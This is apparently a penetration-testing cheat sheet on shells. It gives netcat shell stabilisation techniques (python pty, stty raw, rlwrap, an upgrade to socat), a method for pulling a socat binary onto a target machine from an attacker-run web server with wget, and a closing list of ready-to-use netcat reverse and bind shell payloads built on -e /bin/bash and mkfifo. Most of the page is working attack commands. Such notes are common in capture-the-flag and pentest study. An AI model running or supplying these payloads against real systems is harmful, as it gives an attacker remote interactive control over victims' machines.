# Shells

## Netcat Shell Stabilization

### Technique 1: Python

Step 1:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Step 2:

```bash
export TERM=xterm
```

&#x20;(Gives access to term commands such as clear)

Step 3:

Ctrl + Z and then:

```bash
stty raw -echo; fg
```

This does two things:&#x20;

first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).&#x20;

It then foregrounds the shell, thus completing the process.

**Note that** if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

### Technique 2: rlwrap

Set up a listener:

```bash
rlwrap nc -lvnp <port>
```

Background the shell using Ctrl + Z

Then use:

```bash
stty raw -echo; fg
```

### Technique 3: Socat

The third easy way to stabilize a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.&#x20;

To accomplish this method of stabilization we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine.&#x20;

A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file.&#x20;

On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).



First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Next, in your reverse/bind shell, type in:

`stty rows <number>`

and

`stty cols <number>`

## Common Shell Payloads

`nc -lvnp -e /bin/bash`&#x20;

`nc <LOCAL-IP> <PORT> -e /bin/bash` = this would result in reverse shell on the target

Create a listener for a bind shell (using named pipe (mkfifo)):

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Send netcat reverse shell:

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
